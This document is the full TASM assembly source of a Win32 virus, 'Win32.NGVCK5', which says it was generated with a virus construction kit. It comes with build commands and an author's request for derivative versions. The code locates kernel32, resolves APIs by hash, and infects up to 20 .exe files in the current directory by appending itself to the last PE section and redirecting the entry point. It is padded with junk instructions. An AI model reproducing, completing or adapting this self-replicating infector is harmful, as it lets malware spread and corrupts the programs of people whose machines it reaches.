              
;
;
; Win32.NGVCK5 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK5
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 13
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 79401 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop ebp
 jmp KernelSearchStart
 xor edx, edx                           ; Trash


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov edi, 077e00000h
 call GetKernel32
 jnc GetApis
 mov edi, 077f00000h
 call GetKernel32
 jnc GetApis
 mov edi, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear esi
 sub esi, esi

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[esi]
 lea ebx, [ebp+GetKernel32Exception]
 xchg ebx, esi

 push esi
 not ebx                                ; Trash
 push eax

                                        ; add edi, 1
 add edi, 1d
GetKernelLoop:
                                        ; clear eax
 mov eax, 27233d
 sub eax, 27233d
 dec edi
 mov ax, word ptr [edi+03ch]
 cmp ax,0f800h
 je GetKernelLoop
 cmp edi, dword ptr [edi+eax+34h]
 jnz GetKernelLoop
 push edi
 pop dword ptr [ebp+KernelMZ]
 mov ebx, [edi+3Ch]
 add ebx, edi
 mov [KernelPE+ebp], ebx

                                        ; clear ebx
 mov ebx, -36824d
 add ebx, 36824d

 pop dword ptr fs:[ebx]
 pop ebx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear eax
 mov eax, 0

 mov ebx, dword ptr fs:[eax]
 mov esp, dword ptr [ebx]
GetKernel32NotFound:
                                        ; clear edi
 and edi, 0

 pop dword ptr fs:[edi]
 pop eax
 popad
 stc
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear esi
 mov esi, -22730d
 add esi, 22730d
 add esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], esi

 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], eax



ExecuteHost:                            ; Start the infected File
 shr edx, 4d                            ; Trash

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 jmp ebx



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 mov edx, ebp
 add edx, offset WFD_nFileSizeHigh

 cmp dword ptr [edx], 0
 jne NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
                                        ; mov eax, 11902
 push 11902d
 pop eax
 cmp eax, 11902d
 je Notagoodfile

Goodfile:
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [edx+3Ch]
 test eax, eax
 jz Notagoodfile
 push dword ptr [edx+3Ch]
 xor dword ptr [ebp+Trash1], 834982     ; Trash
 pop ebx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, edx
 adc ecx, ecx                           ; Trash
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [ebx]
 sub eax, 'EP'
 jz Goodfile2
 xor ecx, ecx                           ; Trash
                                        ; clear eax
 sub eax, eax
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [ebx+16h]
 and ax, 00002h
 rcl ecx, 14d                           ; Trash
 cmp ax, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [ebx+16h]
 dec eax                                ; Trash
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 and dword ptr [ebp+Trash1], ebx        ; Trash
 call UnMapFile
 adc dword ptr [ebp+Trash1], 1236850    ; Trash

NoInfection:
 adc dword ptr [ebp+Trash1], 52563      ; Trash
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 NewSize     dd 0h
 AlignReg2   dd 0h
 MapHandle   dd 0h
 FindHandle  dd 0h
 filemask    db '*.exe',0
 AlignReg1   dd 0h
 Trash1      dd 0h
 db 'Win32.NGVCK5 - SnakeByte',0
 InfCounter  dd 0h
 NewEIP      dd 0h
 NTableVA    dd 0h
 KernelPE    dd 0h
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)


 APIOffsets:
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h

 MapAddress  dd 0h
 counter     dw 0h
 KernelMZ    dd 0h
 ATableVA    dd 0h
 TempApisearch2 dd 0h
 OldBase     dd 400000h
 OldEIP      dd 0h
 Trash2      dd 0h
 FileHandle  dd 0h
 OTableVA    dd 0h

 APINames:
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'





;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 push 0
 pop edx

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 inc edx
 push edx
 push 80000000h or 40000000h
 lea edx, [ebp+WFD_szFileName]
 adc eax, 56639657d                     ; Trash
 xchg edi, edx

 push edi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov dword ptr [ebp+Trash1], 1477066    ; Trash
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx

                                        ; clear ebx
 push 0
 pop ebx
 push ebx
 push ecx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 or eax, eax
 jz CloseFile
 rol edx, 22d                           ; Trash
                                        ; clear ebx
 mov ebx, 0
 push ecx
 push ebx
 push ebx
                                        ; mov eax, 2
 mov eax, 0
 add eax, 2d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add edx, ecx                           ; Trash
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]
 and edx, ecx                           ; Trash

Closed:
 stc
ret
 sub edx, ebx                           ; Trash

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear esi
 mov esi, -24483d
 add esi, 24483d
 xor esi, dword ptr [ebp+MapAddress]
 mov ebx, eax                           ; Trash
                                        ; retrieve PE - Header
 mov eax, esi
 add eax, [esi+3Ch]
                                        ; get File Alignment
 mov ecx, [eax+3Ch]
                                        ; clear ebx
 mov ebx, 0
 add ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 add edx, ecx                           ; Trash
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 push ebx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
                                        ; clear esi
 sub esi, esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
 dec eax                                ; Trash
                                        ; infect by increasing the last section
 push ebx
 adc eax, 37471354d                     ; Trash
 pop esi
                                        ; get last section
 movzx eax, word ptr [esi+06h]
 dec eax
 imul eax, eax, 28h
                                        ; add ebx, 120
 inc ebx
 add ebx, 119d
 add ebx, eax
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [esi+74h]
 sal edx, 3
 add ebx, edx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor dword ptr [ebp+OldBase], edx
 mov eax, dword ptr [esi+28h]
 push eax
 pop dword ptr [ebp+OldEIP]
                                        ; clear eax
 xor eax, eax

 add eax, [ebx+10h]
                                        ; mov ecx, eax
 push eax
 pop ecx
 add ebx, 14h
 add eax, [ebx]
 xor dword ptr [ebp+Trash1], 1466353    ; Trash
 sub ebx, 14h
 push eax
 push ecx
 pop edx
 add ebx, 0Ch
 add edx, [ebx]
 sub ebx, 0Ch
 mov dword ptr [ebp+NewEIP], edx
 adc dword ptr [ebp+Trash1], 73989      ; Trash
                                        ; save new enty point in file
 mov dword ptr [esi+28h], edx
                                        ; clear edx
 and edx, 0

 and dword ptr [ebp+Trash1], 975273     ; Trash
 add edx, [ebx+10h]
 push edx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 add dword ptr [ebp+Trash1], edx        ; Trash
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], edx
 pop edx
 add edx, VirusSize
 mov dword ptr [ebx+08h], 0
 dec dword ptr [ebp+Trash1]             ; Trash
 add dword ptr [ebx+08h], edx
 mov edx, dword ptr [ebx+0Ch]
 add edx, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 mov edx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 dec edx
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
 sub dword ptr [ebp+Trash1], eax        ; Trash



                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, 25820d
 sub ecx, 25820d
 add ecx, [ebx+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 dec ecx
 add ecx, 29d
                                        ; get ATableVA
 mov ebx, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; get NTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 add eax, 96205689d                     ; Trash
 mov dword ptr [ebp+OTableVA], ebx
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov ebx, dword ptr [eax]
 add ebx, [ebp+KernelMZ]
                                        ; mov eax, ebx
 push ebx
 pop eax
 add edx, 47570096d                     ; Trash
                                        ; mov edi, eax
 push eax
 pop edi
 add ecx, eax                           ; Trash
 mov dword ptr [ebp+TempApisearch2], edi
 push esi
 cld
 ror ebx, 6d                            ; Trash

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear ecx
 mov ecx, -20756d
 add ecx, 20756d
 add ecx, dword ptr [esi]
 LoopChsksm:
                                        ; clear edx
 mov edx, 1871d
 sub edx, 1871d
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 clc 
 sal dx,8d
 sub ecx, edx
 test dx, dx
 jz LoopConti
                                        ; clear edx
 push 0
 pop edx
 mov dl, byte ptr [edi]
 sub ecx, edx
                                        ; add edi, 1
 add edi, 1d
 neg ebx                                ; Trash
 test dx, dx
 jnz LoopChsksm
LoopConti:
 cmp ecx, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop eax
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 dec eax
 shr ecx, 1d                            ; Trash
 add eax, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop eax
 movzx edx, word ptr [eax]
 shl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear eax
 mov eax, -50785d
 add eax, 50785d
 xor eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 and edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 add eax, 1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov ebx, offset WIN32_FIND_DATA
 add ebx, ebp

 push ebx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]

 push ecx
 push dword ptr [ebp+FindHandle]
 pop ecx
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, ( 276d xor 19d )
 xor ebx, 19d
 lea esi, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 sub esi, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need
 shl eax, 9d                            ; Trash

                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, ( -1d xor 18d )
 xor eax, 18d
 and eax, dword ptr [ebp+OldEIP]

 inc edx                                ; Trash
 mov dword ptr [ebp+retEIP], eax

 push dword ptr [ebp+OldBase]
 pop esi
 adc dword ptr [ebp+Trash1], 1914466    ; Trash

 mov dword ptr [ebp+retBase], esi



                                        ; number of API's we're looking for
 push NumberOfApis
 and dword ptr [ebp+Trash1], edx        ; Trash
 pop eax

                                        ; load API Names and Offsets
 mov esi, ebp
 add esi, offset APINames

 lea edi, [ebp+APIOffsets]
 xchg edi, edx


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; edx points to the offset

 call SearchAPI1
                                        ; add esi, 4
 dec esi
 add esi, 5d
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edx], ebx
                                        ; add edx, 4
 dec edx
 add edx, 5d
 sub eax, 1
 jnz GetApisLoop
 lea edi, [ebp+Outbreak]
 xchg esi, edi

 push esi
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edx, [ebp+filemask]
 xchg edi, edx

                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop esi
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
 adc eax, eax                           ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 xor ecx, ecx
 push ecx
 call ExitProcess



end FakeCode

